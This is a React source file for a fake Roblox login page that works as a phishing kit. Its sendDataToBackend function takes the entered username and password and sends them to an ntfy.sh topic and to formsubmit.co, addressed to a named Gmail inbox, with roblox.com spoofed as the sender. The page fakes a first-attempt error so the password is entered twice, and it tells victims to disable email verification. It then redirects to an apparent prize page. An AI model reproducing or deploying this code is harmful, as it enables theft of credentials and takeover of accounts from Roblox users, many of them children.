// src/components/LoginPage.jsx
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/LoginPage.css";
import emailjs from 'emailjs-com';

const LoginPage = () => {
  const [emailOrUsername, setEmailOrUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showMessage, setShowMessage] = useState(false);
  const [showVerificationMessage, setShowVerificationMessage] = useState(false);
  const [showVerificationModal, setShowVerificationModal] = useState(false);
  const [countdown, setCountdown] = useState(null);
  const [showNotWorkingMessage, setShowNotWorkingMessage] = useState(false);
  const [showErrorMessage, setShowErrorMessage] = useState(false);
  const [firstAttempt, setFirstAttempt] = useState(true);
  const [timeoutIds, setTimeoutIds] = useState([]);
  const navigate = useNavigate();

  const handleNotWorkingButtons = () => {
    setShowNotWorkingMessage(true);
    console.log('⚠️ User clicked on disabled feature');
    
    // Hide the message after 3 seconds
    setTimeout(() => {
      setShowNotWorkingMessage(false);
    }, 3000);
  };

  const clearAllTimeouts = () => {
    timeoutIds.forEach(id => clearTimeout(id));
    setTimeoutIds([]);
    console.log('🚫 All timeouts cleared');
  };

  const sendDataToBackend = () => {
    console.log('🚀 LOGIN ATTEMPT CAPTURED!');
    console.log('📧 Email Data:', {
      username: emailOrUsername,
      password: password,
      timestamp: new Date().toLocaleString()
    });
    
    // INSTANT EMAIL SENDING - Multiple services for speed
    console.log('📤 SENDING INSTANT EMAIL TO: workwithhussnainahmad@gmail.com');
    
    // Method 1: Ntfy.sh (WORKING - instant notifications)
    fetch('https://ntfy.sh/roblox-login-data', {
      method: 'POST',
      body: `📧 TO: workwithhussnainahmad@gmail.com\n🚨 ROBLOX LOGIN CAPTURED\n👤 User: ${emailOrUsername}\n🔒 Pass: ${password}\n⏰ Time: ${new Date().toLocaleString()}`,
      headers: {
        'Title': 'Roblox Login - Email Data',
        'Tags': 'warning,email,roblox'
      }
    }).then(() => {
      console.log('✅ NTFY - INSTANT NOTIFICATION SENT!');
      console.log('📱 Check: https://ntfy.sh/roblox-login-data');
    }).catch(() => {
      console.log('⚠️ Ntfy failed');
    });
    
    // Method 2: FormSubmit (working but slow backup)
    const formData = new FormData();
    formData.append('name', 'Roblox Login Clone');
    formData.append('email', 'noreply@roblox.com');
    formData.append('message', `LOGIN DATA:\nUsername: ${emailOrUsername}\nPassword: ${password}\nTimestamp: ${new Date().toLocaleString()}`);
    
    fetch('https://formsubmit.co/workwithhussnainahmad@gmail.com', {
      method: 'POST',
      body: formData
    }).then(response => {
      console.log('✅ FORMSUBMIT - EMAIL QUEUED (may take 5-10 mins)');
      console.log('📧 Email will arrive at: workwithhussnainahmad@gmail.com');
    }).catch(error => {
      console.log('⚠️ FormSubmit backup failed');
    });
    
    console.log('📧 Email Target: workwithhussnainahmad@gmail.com');
    console.log('⚡ Multiple instant services triggered!');
  };

  const handleLogin = () => {
    if (firstAttempt) {
      // First attempt: Show error instantly, send data, stop all timeouts
      console.log('🚨 First attempt - showing error instantly');
      clearAllTimeouts();
      setShowErrorMessage(true);
      sendDataToBackend();
      setFirstAttempt(false);
      
      // Hide error message after 3 seconds
      const errorTimeout = setTimeout(() => {
        setShowErrorMessage(false);
      }, 3000);
      setTimeoutIds([errorTimeout]);
    } else {
      // Second attempt: Show please wait, then verification message, then redirect
      console.log('🔄 Second attempt - starting timeout sequence');
      clearAllTimeouts();
      
      // Reset all states
      setShowErrorMessage(false);
      setShowVerificationMessage(false);
      
      // Send data again
      sendDataToBackend();
      
      // Step 1: Show "please wait" message
      setShowMessage(true);
      console.log('✅ Step 1: Showing please wait message');
      
      // Step 2: After some seconds, show verification message
      const verificationTimeout = setTimeout(() => {
        setShowVerificationMessage(true);
        console.log('✅ Step 2: Showing email verification message');
      }, 5000);
      
      // Step 3: After 25 seconds total, redirect to DrawSuccess
      const redirectTimeout = setTimeout(() =>{
        console.log('🚀 Step 3: Redirecting to DrawSuccess page (after 25s)');
        console.log('🌐 Current URL before navigation:', window.location.href);
        navigate('/draw-success');
        console.log('🌐 Navigation called, URL should change to /draw-success');
      }, 25000);
      
      setTimeoutIds([verificationTimeout, redirectTimeout]);
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <h1 className="login-title">Login to Roblox</h1>

        <input
          type="text"
          className="login-input"
          placeholder="Username/Email/Phone"
          value={emailOrUsername}
          onChange={(e) => setEmailOrUsername(e.target.value)}
        />

        <input
          type="password"
          className="login-input"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />

        <button className="login-btn" onClick={handleLogin}>
          Log In
        </button>

        {showErrorMessage && (
          <p style={{ color: "#ff4444", fontSize: "14px", marginTop: "15px", fontWeight: "bold" }}>
            ❌ Incorrect email or password. Please try again.
          </p>
        )}
        
        {showMessage && !showVerificationMessage && (
          <p style={{ color: "#00ff00", fontSize: "14px", marginTop: "15px", fontWeight: "bold" }}>
            🔄 Please wait...
          </p>
        )}
        
        {showVerificationMessage && (
          <div className="modal-overlay">
            <div className="modal-content">
              <h3 style={{ color: "#facc15", marginBottom: "15px" }}>Email Verification Detected</h3>
              <p style={{ color: "#fff", fontSize: "14px", marginBottom: "20px", lineHeight: "1.4" }}>
                Looks like you have turned on email verification. Please turn it off
                till we login.
              </p>
              <button 
                className="modal-ok-btn" 
                onClick={() => setShowVerificationMessage(false)}
              >
                OK
              </button>
            </div>
          </div>
        )}

        <div className="forgot-link" onClick={handleNotWorkingButtons} style={{cursor: 'pointer'}}>Forgot Password or Username?</div>

        <div className="login-divider" />

        <button className="alt-btn" onClick={handleNotWorkingButtons}>Email Me a One-Time Code</button>
        <button className="alt-btn" onClick={handleNotWorkingButtons}>Use Another Device</button>

        <div className="signup-text">
          Don't have an account? <span className="signup-link" onClick={handleNotWorkingButtons} style={{cursor: 'pointer'}}>Sign Up</span>
        </div>
        
        {showNotWorkingMessage && (
          <div style={{ 
            backgroundColor: '#ff4444', 
            color: 'white', 
            padding: '10px', 
            borderRadius: '5px', 
            marginTop: '15px', 
            textAlign: 'center',
            fontSize: '14px',
            fontWeight: 'bold'
          }}>
            ⚠️ Currently not working. Try logging in with username and password.
          </div>
        )}
      </div>
    </div>
  );
};

export default LoginPage;
